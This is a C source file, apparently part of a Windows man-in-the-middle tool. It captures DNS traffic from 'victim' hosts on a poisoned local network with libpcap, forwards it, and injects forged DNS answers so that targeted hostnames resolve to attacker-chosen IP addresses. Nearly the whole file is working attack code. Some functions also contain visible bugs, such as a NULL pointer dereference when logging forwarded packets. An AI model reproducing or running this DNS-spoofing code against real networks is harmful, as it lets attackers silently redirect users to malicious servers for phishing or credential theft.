#define HAVE_REMOTE

#include <pcap.h>
#include <stdio.h>

#include "DnsHelper.h"
#include "DnsPoisoning.h"
#include "DnsRequestSpoofing.h"
#include "DnsResponseSpoofing.h"
#include "LinkedListTargetSystems.h"
#include "Logging.h"
#include "ModePcap.h"
#include "NetworkHelperFunctions.h"
#include "PacketHandlerDP.h"

#define MAX_INJECT_RETRIES 4

// Global/external variables
extern PSYSNODE gTargetSystemsList;
extern SCANPARAMS gScanParams;
extern PHOSTNODE gDnsSpoofingList;


/*
 * Receive, parse, resend
 *
 */
DWORD PacketHandlerDP(PSCANPARAMS lpParam)
{
  char cwd[MAX_BUF_SIZE + 1];
  char filter[MAX_BUF_SIZE + 1];
  DWORD retVal = 0;
  char pcapErrorBuffer[PCAP_ERRBUF_SIZE];
  int counter = 0;
  int ifcNum = 0;
  struct bpf_program ifcCode;
  unsigned int netMask = 0;
  int funcRetVal = 0;
  struct pcap_pkthdr *packetHeader = NULL;
  unsigned char *packetData = NULL;

  // Determine and print current working directory
  GetCurrentDirectory(sizeof(cwd)-1, cwd);
  LogMsg(DBG_INFO, "PacketHandlerDP(): Working directory: \"%s\"", cwd);
  
  // Set exit function to trigger depoisoning functions and command.
  SetConsoleCtrlHandler((PHANDLER_ROUTINE)DP_ControlHandler, TRUE);

  // Open interface.
  if ((gScanParams.InterfaceReadHandle = pcap_open_live((char *)gScanParams.InterfaceName, 65536, PCAP_OPENFLAG_NOCAPTURE_LOCAL | PCAP_OPENFLAG_MAX_RESPONSIVENESS, PCAP_READTIMEOUT, pcapErrorBuffer)) == NULL)
  {
    LogMsg(DBG_ERROR, "PacketHandlerDP(): Unable to open the adapter");
    retVal = 5;
    goto END;
  }

  // MAC == LocalMAC and (IP == GWIP or IP == VictimIP
  gScanParams.InterfaceWriteHandle = gScanParams.InterfaceReadHandle;
  ZeroMemory(&ifcCode, sizeof(ifcCode));
  ZeroMemory(filter, sizeof(filter));

  _snprintf(filter, sizeof(filter) - 1, "ip && ether dst %s && port 53 && not src host %s && not dst host %s", gScanParams.LocalMacStr, gScanParams.LocalIpStr, gScanParams.LocalIpStr);
  netMask = 0xffffff; // "255.255.255.0"
  netMask = 0xffff; // "255.255.0.0"
  LogMsg(DBG_INFO, "PacketHandlerDP(): Filter=%s", filter);

  if (pcap_compile((pcap_t *)gScanParams.InterfaceWriteHandle, &ifcCode, (const char *)filter, 1, netMask) < 0)
  {
    LogMsg(DBG_ERROR, "PacketHandlerDP(): Unable to compile the BPF filter \"%s\"", filter);
    retVal = 6;
    goto END;
  }

  if (pcap_setfilter((pcap_t *)gScanParams.InterfaceWriteHandle, &ifcCode) < 0)
  {
    LogMsg(DBG_ERROR, "PacketHandlerDP(): Unable to set the BPF filter \"%s\"", filter);
    retVal = 7;
    goto END;
  }

  LogMsg(DBG_INFO, "PacketHandlerDP(): Enter listening/forwarding loop.");
  while ((funcRetVal = pcap_next_ex((pcap_t*)gScanParams.InterfaceWriteHandle, (struct pcap_pkthdr **) &packetHeader, (const u_char **)&packetData)) >= 0)
  {
    if (funcRetVal == 1)
    {
      DnsPoisoning_handler((unsigned char *)&gScanParams, packetHeader, packetData);
    }
  }

  if (funcRetVal < 0)
  {
    char *errorMsg = pcap_geterr(gScanParams.InterfaceWriteHandle);
    LogMsg(DBG_ERROR, "PacketHandlerDP(): Listener stopped unexpectedly with return value: %d, %s", funcRetVal, errorMsg);
  }
  else
  {
    LogMsg(DBG_INFO, "PacketHandlerDP(): Listener stopped regularly with return value: %d", funcRetVal);
  }

END:

  LogMsg(DBG_INFO, "PacketHandlerDP(): Exit");

  return retVal;
}



/*
 * Callback function invoked by libpcap for every incoming packet
 *
 */
void DnsPoisoning_handler(u_char *param, const struct pcap_pkthdr *pktHeader, const u_char *data)
{
  PSCANPARAMS scanParams = (PSCANPARAMS)param;
  PSYSNODE realDstSys = NULL;
  int bytesSent = 0;
  PACKET_INFO packetInfo;
  char hostName[512];

  if (pktHeader == NULL || 
      pktHeader->len <= 0 || 
      data == NULL)
  {
    return;
  }

  ZeroMemory(hostName, sizeof(hostName));
  ZeroMemory(&packetInfo, sizeof(packetInfo));
  PrepareDataPacketStructure(data, &packetInfo);
  packetInfo.pcapDataLen = pktHeader->len;

  IpBin2String((unsigned char *)&packetInfo.ipHdr->daddr, (unsigned char *)packetInfo.dstIp, sizeof(packetInfo.dstIp) - 1);
  IpBin2String((unsigned char *)&packetInfo.ipHdr->saddr, (unsigned char *)packetInfo.srcIp, sizeof(packetInfo.srcIp) - 1);

  CopyMemory(&packetInfo.srcIpBin, &packetInfo.ipHdr->saddr, 4);
  CopyMemory(&packetInfo.dstIpBin, &packetInfo.ipHdr->daddr, 4);

  // Determine Hostname to resolve
  if ((packetInfo.dstPort == 53 || packetInfo.srcPort == 53) &&
      packetInfo.udpHdr != NULL &&
      GetHostnameFromPcapDnsPacket((u_char *)data, hostName, 512) == FALSE)
  {
    strcpy(hostName, "UNKNOWN");
  }

  snprintf(packetInfo.logMsg, sizeof(packetInfo.logMsg) - 1, "%%-5s %-4s %-15s %5d -> %-15s %-5d    %5d bytes    %s   (%s)",
    packetInfo.proto, packetInfo.srcIp, packetInfo.srcPort, packetInfo.dstIp,
    packetInfo.dstPort, packetInfo.pktLen, packetInfo.suffix, hostName);

  // Destination IP is GW
  if (memcmp(&packetInfo.ipHdr->daddr, scanParams->GatewayIpBin, BIN_IP_LEN) == 0)
  {
    if (ProcessData2GW(&packetInfo, scanParams) == FALSE)
    {
      LogMsg(DBG_ERROR, "Unable to send DATA 2 GW");
    }

  // Destination is victim system
  }
  else if ((realDstSys = GetNodeByIp(gTargetSystemsList, (unsigned char *)&packetInfo.ipHdr->daddr)) != NULL)
  {
    if (ProcessData2Victim(&packetInfo, realDstSys, scanParams) == FALSE)
    {
      LogMsg(DBG_ERROR, "Unable to send DATA 2 VICTIM");
    }

    // Destination IP is not inside the Network range.
    // Forward packet to the GW
  }
  else if (ProcessData2Internet(&packetInfo, scanParams) == FALSE)
  {
    LogMsg(DBG_ERROR, "Unable to send DATA 2 INTERNET");
  }
  else
  {
    // Data successfully forwarded    
  }
}



BOOL ProcessData2Internet(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
{
  BOOL retVal = FALSE;
  PPOISONING_DATA poisoningData = NULL;

  // When user sends DNS request to an external DNS server, send back
  // a spoofed answer packet.
  if (packetInfo->udpHdr != NULL &&
     (poisoningData = (PPOISONING_DATA)DnsRequestPoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL)
  {
    LogMsg(DBG_DEBUG, "Request DNS poisoning C2I succeeded : Requested:%s, Pattern:%s/%s -> %s", poisoningData->HostnameToResolve, poisoningData->HostnodeToSpoof->Data.HostName, poisoningData->HostnodeToSpoof->Data.HostNameWithWildcard, poisoningData->HostnodeToSpoof->Data.SpoofedIp);
    retVal = DnsRequestSpoofing(packetInfo->pcapData, (pcap_t *)scanParams->InterfaceWriteHandle, poisoningData, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp);
    HeapFree(GetProcessHeap(), 0, poisoningData);

    return retVal;
  }
  
  CopyMemory(packetInfo->etherHdr->ether_dhost, scanParams->GatewayMacBin, BIN_MAC_LEN);
  CopyMemory(packetInfo->etherHdr->ether_shost, scanParams->LocalMacBin, BIN_MAC_LEN);
  LogMsg(DBG_INFO, packetInfo->logMsg, "OUT", poisoningData->HostnameToResolve);

  return SendPacket(MAX_INJECT_RETRIES, scanParams->InterfaceWriteHandle, packetInfo->pcapData, packetInfo->pcapDataLen);
}


BOOL ProcessData2Victim(PPACKET_INFO packetInfo, PSYSNODE realDstSys, PSCANPARAMS scanParams)
{
  PPOISONING_DATA poisoningData = NULL;
  BOOL retVal = FALSE;
  char spoofedDnsPacket[8192] = { 0 };
  int spoofedDnsPacketLen = 0;

  CopyMemory(packetInfo->etherHdr->ether_dhost, realDstSys->data.sysMacBin, BIN_MAC_LEN);
  CopyMemory(packetInfo->etherHdr->ether_shost, scanParams->LocalMacBin, BIN_MAC_LEN);
  LogMsg(DBG_INFO, packetInfo->logMsg, "IN", "OH NOOOOOO!");
  
  // When user receives DNS response, send back
  // a spoofed answer packet.
  if (packetInfo->udpHdr != NULL &&
    (poisoningData = DnsResponsePoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL)
  {

    LogMsg(DBG_DEBUG, "Response DNS poisoning *2C succeeded : %s/%s -> %s", poisoningData->HostnodeToSpoof->Data.HostName, poisoningData->HostnodeToSpoof->Data.HostNameWithWildcard, poisoningData->HostnodeToSpoof->Data.SpoofedIp);
    retVal = DnsResponseSpoofing(packetInfo->pcapData, (pcap_t *)scanParams->InterfaceWriteHandle, poisoningData, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp);
    HeapFree(GetProcessHeap(), 0, poisoningData);

    return retVal;
  }

  return SendPacket(MAX_INJECT_RETRIES, scanParams->InterfaceWriteHandle, packetInfo->pcapData, packetInfo->pcapDataLen);
}


BOOL ProcessData2GW(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
{
  PPOISONING_DATA tmpNode = NULL;

  // When user sends DNS request to the gateway, send back
  // a spoofed answer packet.
  if (packetInfo->udpHdr != NULL &&
      (tmpNode = DnsRequestPoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL)
  {
    LogMsg(DBG_DEBUG, "Request DNS poisoning C2GW succeeded : %s/%s -> %s/%s", tmpNode->HostnodeToSpoof->Data.HostName, tmpNode->HostnodeToSpoof->Data.HostNameWithWildcard, tmpNode->HostnodeToSpoof->Data.SpoofedIp, tmpNode->HostnodeToSpoof->Data.CnameHost);
    return  DnsRequestSpoofing(packetInfo->pcapData, (pcap_t *)scanParams->InterfaceWriteHandle, tmpNode, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp);
  }

  CopyMemory(packetInfo->etherHdr->ether_dhost, scanParams->GatewayMacBin, BIN_MAC_LEN);
  CopyMemory(packetInfo->etherHdr->ether_shost, scanParams->LocalMacBin, BIN_MAC_LEN);
  LogMsg(DBG_INFO, packetInfo->logMsg, "GW", "OH NOOOOO!!!");

  HeapFree(GetProcessHeap(), 0, tmpNode);
  return SendPacket(MAX_INJECT_RETRIES, scanParams->InterfaceWriteHandle, packetInfo->pcapData, packetInfo->pcapDataLen);
}



void PrepareDataPacketStructure(const u_char *data, PPACKET_INFO packetInfo)
{
  ZeroMemory(packetInfo, sizeof(PACKET_INFO));

  packetInfo->pcapData = (u_char*)data;
  packetInfo->etherHdr = (PETHDR)data;
  packetInfo->ipHdr = (PIPHDR)(data + 14);
  packetInfo->ipHdrLen = (packetInfo->ipHdr->ver_ihl & 0xf) * 4;

  if (packetInfo->ipHdr->proto == IP_PROTO_TCP) // TCP
  {
    packetInfo->tcpHdr = (PTCPHDR)((unsigned char*)packetInfo->ipHdr + packetInfo->ipHdrLen);
    strcat(packetInfo->proto, "TCP");

    packetInfo->pktLen = ntohs(packetInfo->ipHdr->tlen) - packetInfo->ipHdrLen - packetInfo->tcpHdr->doff * 4;
    packetInfo->dstPort = ntohs(packetInfo->tcpHdr->dport);
    packetInfo->srcPort = ntohs(packetInfo->tcpHdr->sport);
    snprintf(packetInfo->suffix, sizeof(packetInfo->suffix) - 1, "[%s%s%s%s%s%s]",
      packetInfo->tcpHdr->ack ? "a" : " ",
      packetInfo->tcpHdr->syn ? "s" : " ",
      packetInfo->tcpHdr->psh ? "p" : " ",
      packetInfo->tcpHdr->fin ? "f" : " ",
      packetInfo->tcpHdr->rst ? "r" : " ",
      packetInfo->tcpHdr->urg ? "u" : " ");
  }
  else if (packetInfo->ipHdr->proto == 17) // UDP
  {
    packetInfo->udpHdr = (PUDPHDR)((unsigned char*)packetInfo->ipHdr + packetInfo->ipHdrLen);
    strcat(packetInfo->proto, "UDP");
    packetInfo->pktLen = ntohs(packetInfo->udpHdr->ulen);
    packetInfo->dstPort = ntohs(packetInfo->udpHdr->dport);
    packetInfo->srcPort = ntohs(packetInfo->udpHdr->sport);
  }
  else if (packetInfo->ipHdr->proto == 1)
  {
    strcat(packetInfo->proto, "ICMP");
  }
  else
  {
    strcat(packetInfo->proto, "Unknown");
  }
}


BOOL SendPacket(int maxTries, LPVOID writeHandle, u_char *data, unsigned int dataSize)
{
  BOOL retVal = FALSE;
  int counter = 0;

  for (; counter < maxTries; counter++)
  {
    if (pcap_sendpacket(writeHandle, data, dataSize) == 0)
    {
      retVal = TRUE;
      break;
    }
  }

  return retVal;
}



BOOL DP_ControlHandler(DWORD pControlType)
{
  switch (pControlType)
  {
    // Handle the CTRL-C signal. 
  case CTRL_C_EVENT:
    LogMsg(DBG_INFO, "Ctrl-C event : Starting depoisoning process");
    CloseAllPcapHandles();
    LogMsg(DBG_INFO, "Ctrl-C event : pcap closed");
    return FALSE;

  case CTRL_CLOSE_EVENT:
    LogMsg(DBG_INFO, "Ctrl-Close event : Starting depoisoning process");
    CloseAllPcapHandles();
    LogMsg(DBG_INFO, "Ctrl-Close event : pcap closed");
    return FALSE;

  case CTRL_BREAK_EVENT:
    LogMsg(DBG_INFO, "Ctrl-Break event : Starting depoisoning process");
    CloseAllPcapHandles();
    LogMsg(DBG_INFO, "Ctrl-Break event : pcap closed");
    return FALSE;

  case CTRL_LOGOFF_EVENT:
    printf("Ctrl-Logoff event : Starting depoisoning process");
    CloseAllPcapHandles();
    LogMsg(DBG_INFO, "Ctrl-Logoff event : pcap closed");
    return FALSE;

  case CTRL_SHUTDOWN_EVENT:
    LogMsg(DBG_INFO, "Ctrl-Shutdown event : Starting depoisoning process");
    CloseAllPcapHandles();
    LogMsg(DBG_INFO, "Ctrl-Shutdown event : pcap closed");
    return FALSE;

  default:
    LogMsg(DBG_INFO, "Unknown event \"%d\" : Starting depoisoning process", pControlType);
    CloseAllPcapHandles();
    LogMsg(DBG_INFO, "Unknown event : pcap closed");
    return FALSE;
  }
}



void CloseAllPcapHandles()
{
  if (gScanParams.PcapFileHandle != NULL)
  {
    LogMsg(DBG_INFO, "CloseAllPcapHandles(): Closing gScanParams.PcapFileHandle");
    pcap_breakloop(gScanParams.PcapFileHandle);
    pcap_close(gScanParams.PcapFileHandle);
    LogMsg(DBG_INFO, "CloseAllPcapHandles(): Closing gScanParams.PcapFileHandle done");
  }

  if (gScanParams.InterfaceWriteHandle != NULL)
  {
    LogMsg(DBG_INFO, "CloseAllPcapHandles(): Closing gScanParams.InterfaceWriteHandle");
    pcap_breakloop(gScanParams.InterfaceWriteHandle);
    pcap_close(gScanParams.InterfaceWriteHandle);
    LogMsg(DBG_INFO, "CloseAllPcapHandles(): Closing gScanParams.InterfaceWriteHandle done");
  }

  if (gScanParams.InterfaceReadHandle != NULL)
  {
    LogMsg(DBG_INFO, "CloseAllPcapHandles(): Closing gScanParams.InterfaceReadHandle");
    pcap_breakloop(gScanParams.InterfaceReadHandle);
    pcap_close(gScanParams.InterfaceReadHandle);
    LogMsg(DBG_INFO, "CloseAllPcapHandles(): Closing gScanParams.InterfaceReadHandle done");
  }
}
